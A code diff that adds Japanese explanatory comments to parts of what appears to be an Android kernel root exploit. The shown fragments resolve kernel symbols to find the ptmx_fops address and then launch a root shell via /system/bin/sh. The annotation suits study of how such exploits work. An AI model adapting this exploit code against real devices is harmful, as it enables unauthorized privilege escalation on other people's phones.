@@ -251,17 +251,17 @@ find_ptmx_fops_address(kallsyms *info, void *mem, size_t length)
 {
   find_ptmx_fops_hint_t hint;
 
-  hint.ptmx_open_address = kallsyms_in_memory_lookup_name(info, "ptmx_open");
+  hint.ptmx_open_address = kallsyms_in_memory_lookup_name(info, "ptmx_open"); // ptmx_fopsのアドレス算出に必要なptmx_openのアドレスを探索
   if (!hint.ptmx_open_address) {
     return false;
   }
 
-  hint.tty_release_address = kallsyms_in_memory_lookup_name(info, "tty_release");
+  hint.tty_release_address = kallsyms_in_memory_lookup_name(info, "tty_release"); // ptmx_fopsのアドレス算出に必要なtty_releaseのアドレスを探索
   if (!hint.tty_release_address) {
     return false;
   }
 
-  hint.tty_fasync_address = kallsyms_in_memory_lookup_name(info, "tty_fasync");
+  hint.tty_fasync_address = kallsyms_in_memory_lookup_name(info, "tty_fasync"); // ptmx_fopsのアドレス算出に必要なtty_fasyncのアドレスを探索
   if (!hint.tty_fasync_address) {
     return false;
   }
@@ -388,7 +388,7 @@ main(int argc, char **argv)
   if (command == NULL) {
     system("/system/bin/sh"); //　特権の取得に成功！
   } else {
-    execl("/system/bin/sh", "/system/bin/sh", "-c", command, NULL);　//　特権の取得に成功！
+    execl("/system/bin/sh", "/system/bin/sh", "-c", command, NULL); //　特権の取得に成功！
   }
 
   exit(EXIT_SUCCESS);
